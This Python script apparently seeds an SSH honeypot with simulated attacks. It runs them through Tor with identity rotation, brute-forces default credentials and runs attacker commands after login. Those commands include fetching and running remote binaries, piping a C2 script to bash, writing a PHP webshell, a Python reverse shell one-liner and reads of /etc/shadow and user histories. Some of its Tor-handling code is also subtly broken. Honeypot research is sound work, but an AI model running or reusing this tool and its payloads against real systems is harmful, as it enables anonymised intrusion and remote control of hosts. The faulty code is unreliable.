#!/usr/bin/env python3
"""Professional attack seeding via Tor - realistic attacker simulation

Attack profiles based on real-world patterns:
- MIRAI botnet behavior (automated, no interaction)
- Script kiddie (noisy brute force, common commands)
- Manual pentester (careful enumeration, targeted payloads)
- Opportunistic attacker (standard credentials, common malware drops)
"""
import os
import asyncio
import asyncssh
import random
from datetime import datetime, timezone
from typing import List, Dict, Optional

# Configuration
TOR_PROXY = os.getenv("TOR_PROXY", "tor:9050")
PUBLIC_IP = os.getenv("PUBLIC_IP", "127.0.0.1")  # Honeypot public IP
SSH_PORT = int(os.getenv("SSH_PORT", 22))
SEED_INTERVAL = int(os.getenv("SEED_INTERVAL", 60))

# Realistic attacker profiles
ATTACK_PROFILES = [
    {
        "name": "Mirai_Botnet",
        "usernames": ["root", "admin", "user"],
        "passwords": ["", "admin", "123456", "password", "root"],
        "commands_after_auth": [
            "cat /dev/null",  # Test connectivity
            "wget http://185.132.189.1/{arch}.bin -O /tmp/.s{uuid}.bin".replace("{uuid}", "XXXXXX"),
            "chmod +x /tmp/.s{uuid}.bin".replace("{uuid}", "XXXXXX"),
            "/tmp/.s{uuid}.bin".replace("{uuid}", "XXXXXX"),
            "rm -f /tmp/.s{uuid}.bin".replace("{uuid}", "XXXXXX"),
        ],
        "duration_min": 2,
        "duration_max": 15,
    },
    {
        "name": "Script_Kiddie",
        "credentials": [
            ("root", "root"),
            ("admin", "admin"),
            ("pi", "raspberry"),
            ("ubuntu", "ubuntu"),
            ("user", "user"),
        ],
        "commands_after_auth": [
            "uname -a",
            "cat /etc/passwd",
            "wget http://malware.example.com/shell.sh -O /tmp/shell.sh",
            "curl http://c2.badguy.net/payload.sh | bash",
            "cat /proc/cpuinfo",
            "ls -la /var/log",
            "cat /var/log/auth.log 2>/dev/null || dmesg",
        ],
        "duration_min": 5,
        "duration_max": 30,
    },
    {
        "name": "Manual_Pentest",
        "credentials": [
            ("test", "test123"),
            ("deploy", "deploy"),
            ("guest", "guest"),
        ],
        "commands_after_auth": [
            "id",
            "whoami",
            "pwd",
            "ls -la",
            "cat /etc/shadow 2>/dev/null",
            "find / -name '*.ssh' -type d 2>/dev/null",
            "cat /home/*/.bash_history 2>/dev/null | head -20",
            "ss -tuln",
            "ps aux | grep root",
        ],
        "duration_min": 10,
        "duration_max": 60,
    },
    {
        "name": "Webshell_Dropper",
        "credentials": [
            ("www-data", "www-data"),
            ("apache", "apache"),
            ("nobody", "nobody"),
        ],
        "commands_after_auth": [
            "which wget curl 2>/dev/null || echo 'no download tools'",
            "curl -s http://pastebin.com/raw/attack_payload -o /tmp/wso.php",
            "ls -la /var/www/html 2>/dev/null",
            "echo '<?php system($_GET[cmd]); ?>' > /tmp/shell.php",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        ],
        "duration_min": 15,
        "duration_max": 120,
    },
]

async def get_tor_exit_ip(proxy_host: str) -> str:
    """Get current public IP through Tor SOCKS proxy"""
    import aiohttp
    try:
        connector = aiohttp.SOCKSConnector.from_url(f"socks5://{proxy_host}")
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("https://api.ipify.org?format=json", timeout=10) as resp:
                data = await resp.json()
                return data["ip"]
    except Exception as e:
        print(f"[!] Tor IP lookup failed: {e}")
        return "0.0.0.0"

async def signal_newnym(proxy_host: str):
    """Request new Tor circuit"""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(proxy_host.split(':')[0], 9050),
            timeout=5.0
        )
        writer.write(b"SIGNAL NEWNYM\r\n")
        writer.close()
        await writer.wait_closed()
        print("[+] New Tor identity requested")
    except Exception as e:
        print(f"[!] Failed to signal newnym: {e}")

async def simulate_ssh_attack(target_ip: str, target_port: int, profile: dict) -> int:
    """Simulate realistic SSH attack via Tor"""
    session_id = f"{profile['name'].lower()}-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    
    try:
        # Random credential
        if profile.get('credentials'):
            username, password = random.choice(profile['credentials'])
        else:
            username = random.choice(profile['usernames'])
            password = random.choice(profile['passwords'])
        
        print(f"[*] Attempting SSH: {username}@{target_ip}:{target_port} via Tor")
        
        # Connect via SOCKS proxy
        conn = await asyncssh.connect(
            target_ip, target_port,
            username=username,
            password=password,
            sock_proxy=(f"{TOR_PROXY.split('//')[1].split(':')[0]}", 9050),
            known_hosts=None,
            client_keys=[],
            keepalive_interval=10,
            login_timeout=30,
        )
        
        # Execute commands simulating session
        commands = profile.get('commands_after_auth', [])
        for cmd in commands[:random.randint(1, len(commands))]:
            try:
                result = await conn.run(cmd, check=False, timeout=5)
                print(f"    $ {cmd[:50]}...")
                await asyncio.sleep(random.uniform(0.5, 2))  # Human-like pause
            except Exception:
                pass
        
        # Keep session alive for random duration
        duration = random.randint(profile.get('duration_min', 5), profile.get('duration_max', 30))
        await asyncio.sleep(min(duration, 30))  # Cap at 30s for testing
        
        conn.close()
        return 1  # Success
        
    except asyncssh.AuthenticationException:
        print(f"[+] Auth failed (expected for honeypot) - session recorded")
        return 1
    except Exception as e:
        print(f"[!] SSH error: {type(e).__name__}: {e}")
        return 0

async def run_seed_worker():
    """Main attack seeding loop"""
    print(f"[+] Starting Pro Seed Worker")
    print(f"[+] Target: {PUBLIC_IP}:{SSH_PORT}")
    print(f"[+] Tor proxy: {TOR_PROXY}")
    print(f"[+] Interval: {SEED_INTERVAL}s")
    print(f"[+] Profiles: {len(ATTACK_PROFILES)}")
    
    while True:
        # Pick random profile
        profile = random.choice(ATTACK_PROFILES)
        print(f"\n=== [{datetime.now().strftime('%H:%M:%S')}] Profile: {profile['name']} ===")
        
        # Run attack
        result = await simulate_ssh_attack(PUBLIC_IP, SSH_PORT, profile)
        
        if result:
            # Request new Tor identity
            await signal_newnym(TOR_PROXY)
        
        # Wait before next attack
        await asyncio.sleep(SEED_INTERVAL)

if __name__ == "__main__":
    asyncio.run(run_seed_worker())